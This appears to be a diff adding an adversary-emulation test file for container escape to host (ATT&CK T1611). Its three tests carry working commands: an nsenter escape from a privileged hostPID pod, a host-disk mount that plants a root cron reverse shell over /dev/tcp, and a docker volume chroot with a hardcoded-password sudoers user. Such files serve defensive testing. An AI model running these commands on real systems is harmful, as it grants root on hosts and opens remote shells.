@@ -1,0 +1,182 @@
+attack_technique: T1611
+display_name: "Escape to Host"
+
+atomic_tests:
+- name: Deploy container using nsenter container escape
+  auto_generated_guid: 0b2f9520-a17a-4671-9dba-3bd034099fff
+  description: |
+    In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
+
+    Additional Details:
+    - https://twitter.com/mauilion/status/1129468485480751104
+    - https://securekubernetes.com/scenario_2_attack/
+  supported_platforms:
+  - containers
+
+  dependency_executor_name: sh
+  dependencies:
+  - description: Verify docker is installed.
+    prereq_command: |
+      which docker
+    get_prereq_command: |
+      if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
+
+  - description: Verify docker service is running.
+    prereq_command: |
+      sudo systemctl status docker
+    get_prereq_command: |
+      sudo systemctl start docker
+
+  - description: Verify kind is in the path.
+    prereq_command: |
+      which kind
+    get_prereq_command: |
+      curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+      chmod +x ./kind
+      mv kind /usr/bin/kind
+
+  - description: Verify kind-atomic-cluster is created
+    prereq_command: |
+      sudo kind get clusters
+    get_prereq_command: |
+      sudo kind create cluster --name atomic-cluster
+
+  - description: Verify kubectl is in path
+    prereq_command: |
+      which kubectl
+    get_prereq_command: |
+      curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+      chmod +x ./kubectl
+      mv kubectl /usr/bin/kubectl
+
+  executor:
+    command: |
+      kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
+    name: sh
+    cleanup_command: |
+      kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
+- name: Mount host filesystem to escape privileged Docker container
+  auto_generated_guid: 6c499943-b098-4bc6-8d38-0956fc182984
+  description: |
+    This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.
+    The container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.
+    Dev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. 
+
+  supported_platforms:
+  - containers
+
+  input_arguments:
+    mount_device:
+      description: Path to the device of the host's disk to mount
+      type: path
+      default: /dev/dm-0
+
+    mount_point:
+      description: Path where the host filesystem will be mounted
+      type: path
+      default: /mnt/T1611.002
+
+    cron_path:
+      description: Path on the host filesystem where cron jobs are stored
+      type: path
+      default: /etc/cron.d
+
+    cron_filename:
+      description: Filename of the cron job in cron_path
+      type: string
+      default: T1611_002
+
+    listen_address:
+      description: IP address to listen for callback from the host system.
+      type: string
+      default: "`ifconfig eth0 | grep inet | awk '{print $2}'`"
+
+    listen_port:
+      description: TCP Port to listen on for callback from the host system.
+      type: integer
+      default: 4444
+
+  dependency_executor_name: sh
+  dependencies:
+  - description: Verify mount is installed.
+    prereq_command: |
+      which mount
+    get_prereq_command: |
+      if [ "" == "`which mount`" ]; then echo "mount Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install mount ; elif [ -n "`which yum`" ]; then sudo yum -y install mount ; fi ; else echo "mount installed"; fi
+
+  - description: Verify container is privileged.
+    prereq_command: |
+      capsh --print | grep cap_sys_admin
+    get_prereq_command: |
+      if [ "`capsh --print | grep cap_sys_admin`" == "" ]; then echo "Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
+
+  - description: Verify mount device (/dev/dm-0) exists.
+    prereq_command: |
+      ls #{mount_device}
+    get_prereq_command: |
+      if [ ! -f #{mount_device} ]; then echo "Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
+
+  - description: Netcat is installed.
+    prereq_command: |
+      which netcat
+    get_prereq_command: |
+      if [ "" == "`which netcat`" ]; then echo "netcat Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install netcat ; elif [ -n "`which yum`" ]; then sudo yum -y install netcat ; fi
+
+  - description: IP Address is known.
+    prereq_command: |
+      if [ "#{listen_address}" != "" ]; then echo "Listen address set as #{listen_address}" ; fi
+    get_prereq_command: |
+      if [ "" == "`which ifconfig`" ]; then echo "ifconfig Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install net=tools ; elif [ -n "`which yum`" ]; then sudo yum -y install net-tools ; fi
+
+  executor:
+    name: sh
+    elevation_required: true
+    command: |
+      if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi
+      echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}
+      echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
+      echo -n "(hostname) " >> #{mount_point}#{cron_path}/#{cron_filename}
+      echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
+      echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}
+      netcat -l -p #{listen_port} 2>&1
+    cleanup_command: |
+      rm #{mount_point}#{cron_path}/#{cron_filename}
+      umount #{mount_point}
+      rmdir #{mount_point}
+- name: Privilege Escalation via Docker Volume Mapping
+  auto_generated_guid: 39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4
+  description: |
+    This test demonstrates privilege escalation by abusing Docker's volume mapping
+    feature to gain access to the host file system. By mounting the root directory
+    of the host into a Docker container, the attacker can use chroot to operate as
+    root on the host system.
+  supported_platforms:
+    - containers
+  input_arguments:
+    username:
+      default: docker_user
+      description: Username that run attack command
+      type: string
+  dependencies:
+    - description: Docker
+      prereq_command: |
+        command -v docker &> /dev/null && echo "Docker is installed" || { echo "Docker is not installed."; exit 1; }
+      get_prereq_command: |
+        echo "You should install docker manually."
+    - description: Docker Privileged User
+      prereq_command: |
+        sudo -l -U #{username} | grep "(ALL) NOPASSWD: /usr/bin/docker"
+      get_prereq_command: |
+        USERNAME="#{username}"
+        PASSWORD="password123"
+        SUDO_COMMAND="/usr/bin/docker"
+        SUDOERS_FILE="/etc/sudoers.d/$USERNAME"
+        [[ $EUID -ne 0 ]] && echo "Run as root." && exit 1; id "$USERNAME" &>/dev/null || { useradd -m -s /bin/bash "$USERNAME" && echo "$USERNAME:$PASSWORD" | chpasswd; }; [[ -f "$SUDOERS_FILE" ]] || { echo "$USERNAME ALL=(ALL) NOPASSWD: $SUDO_COMMAND" > "$SUDOERS_FILE" && chmod 440 "$SUDOERS_FILE"; }; echo "Setup complete. User: $USERNAME, Password: $PASSWORD"
+  executor:
+    name: sh
+    elevation_required: true
+    command: |
+      echo "Current user: #{username}"
+      sudo -u docker_user sh -c "sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"
+    cleanup_command: |
+      USERNAME="#{username}"; SUDOERS_FILE="/etc/sudoers.d/$USERNAME"; id "$USERNAME" &>/dev/null && userdel -r "$USERNAME" && echo -e "$USERNAME is deleted."; [[ -f "$SUDOERS_FILE" ]] && rm -f "$SUDOERS_FILE"; echo "Cleanup complete."
